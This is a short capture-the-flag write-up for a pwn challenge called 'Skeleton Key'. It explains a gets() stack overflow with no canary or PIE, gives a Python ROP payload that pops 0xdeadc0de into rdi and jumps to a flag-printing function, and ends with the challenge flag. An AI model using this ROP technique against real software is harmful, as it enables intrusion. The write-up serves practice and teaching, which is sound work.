# Skeleton Key — PWN (125 pts)

Remote: 159.65.228.107:5002. Same setup as The Crypt, but this time there's a lock to pick with a ROP chain.

## How I solved it

`main` does `gets()` into a 0x40 buffer — 72 bytes to saved RIP, no PIE, no canary. There's a function `Wretched_Lock` at `0x401507` that cats the flag, but only if `edi == 0xdeadc0de`. And `gadgets()` contains a `pop rdi; ret` at `0x401615`.

So:

```python
payload  = b"A"*72
payload += p64(0x401615)   # pop rdi; ret
payload += p64(0xdeadc0de)
payload += p64(0x401507)   # Wretched_Lock(0xdeadc0de) -> cat flag
```

Stack alignment worked out without needing an extra ret gadget. Send it, get the flag.

## Flag

```
deadface{R355UR3CT_D34D_C0D3}
```
